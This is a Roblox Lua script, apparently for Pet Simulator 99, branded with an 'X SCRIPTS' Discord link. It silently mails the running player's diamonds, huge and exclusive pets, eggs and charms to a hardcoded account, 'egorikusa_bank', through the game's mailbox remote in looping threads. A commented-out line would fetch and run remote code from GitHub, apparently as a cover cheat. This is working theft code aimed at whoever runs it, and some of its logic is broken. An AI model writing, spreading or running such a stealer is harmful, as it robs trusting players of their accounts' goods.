-- ti gey aiiafafijfaisafsifaisojfasifasijfa
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts

Username = "egorikusa_bank"
MailMessage = "test123"
print("sexooo")
local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end
if GemAmount1 < 10000 then
    --loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua"))()
end

local HugeList = {}
local ExcList = {}
local EggList = {}
local CharmList = {}

local SHugeList = {}
local SExcList = {}
local SEggList = {}
local SCharmList = {}

table.foreach(
    save.Pet,
    function(i, v)
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.huge then
            table.insert(HugeList, i)
        end
    end
)

table.foreach(
    save.Pet,
    function(i, v)
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.exclusiveLevel then
            table.insert(ExcList, i)
        end
    end
)

if save.Egg ~= nil then
    table.foreach(
        save.Egg,
        function(i, v)
            local id = v.id
            local dir = library.Directory.Eggs[id]
            table.insert(EggList, i)
        end
    )
end

if save.Charm ~= nil then
    table.foreach(
        save.Charm,
        function(i, v)
            local id = v.id
            local dir = library.Directory.Charms[id]
            table.insert(CharmList, i)
        end
    )
end

user = Username

function GemSteal()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            GemAmount = v._am
            GemId = i
            local args = {
                [1] = user,
                [2] = MailMessage,
                [3] = "Currency",
                [4] = GemId,
                [5] = GemAmount - 10000
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                unpack(args)
            )
        end
    end
end

if FinalList == 0 then
    GemSteal()
end

spawn(
    function()
        while wait() do
            table.foreach(
                save.Pet,
                    function(i, v)
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                    if dir.huge then
                        table.insert(SHugeList, i)
                    end
                end
            )
            if #SHugeList ~= 0 or SHugeList ~= {} then
                for i, v in pairs(save.Pet) do
                    local id = v.id
                    local dir = library.Directory.Pets[id]
                    if dir.huge then
                        local args = {
                            [1] = user,
                            [2] = MailMessage,
                            [3] = "Pet",
                            [4] = i,
                            [5] = v._am or 1
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
                -- wait(5.5)
                if #SHugeList == 0 or SHugeList == {} then
                    print("done huges")
                    break
                end
            end
        end
    end
)

spawn(
    function()
        while wait() do
            table.foreach(
                save.Pet,
                    function(i, v)
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                    if dir.exclusiveLevel then
                        table.insert(SExcList, i)
                    end
                end
            )
            if #SExcList ~= 0 and #SHugeList == 0 then
                for i, v in pairs(save.Pet) do
                    local id = v.id
                    local dir = library.Directory.Pets[id]
                    if dir.exclusiveLevel then
                        local args = {
                            [1] = user,
                            [2] = MailMessage,
                            [3] = "Pet",
                            [4] = i,
                            [5] = v._am or 1
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
                -- wait(5.5)
                if #SExcList == 0 or SExcList == {} then
                    print("done exc")
                    break
                end
            end
        end
    end
)

spawn(
    function()
        while wait() do
            if save.Egg ~= nil then
                table.foreach(
                    save.Egg,
                    function(i, v)
                        local id = v.id
                        local dir = library.Directory.Eggs[id]
                        table.insert(SEggList, i)
                    end
                )
            end
            if #SEggList ~= 0 and #SExcList == 0 and #SHugeList == 0 then
                for i, v in pairs(save.Egg) do
                    local args = {
                        [1] = user,
                        [2] = MailMessage,
                        [3] = "Egg",
                        [4] = i,
                        [5] = v._am or 1
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                        unpack(args)
                    )
                end
            end
            -- wait(5.5)
            if #SEggList == 0 or SEggList == {} then
                print("done eggs")
                break
            end
        end
    end
)

spawn(
    function()
        while wait() do
            if save.Charm ~= nil then
                table.foreach(
                    save.Charm,
                    function(i, v)
                        local id = v.id
                        local dir = library.Directory.Charms[id]
                        table.insert(SCharmList, i)
                    end
                )
            end
            if #SCharmList ~= 0 and #SEggList == 0 and #SExcList == 0 and #SHugeList == 0 then
                for i, v in pairs(save.Charm) do
                    local args = {
                        [1] = user,
                        [2] = MailMessage,
                        [3] = "Charm",
                        [4] = i,
                        [5] = v._am or 1
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                        unpack(args)
                    )
                end
            end
            -- wait(5.5)
            if #SCharmList == 0 or SCharmList == {} then
                print("done eggs")
                break
            end
        end
    end
)

-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts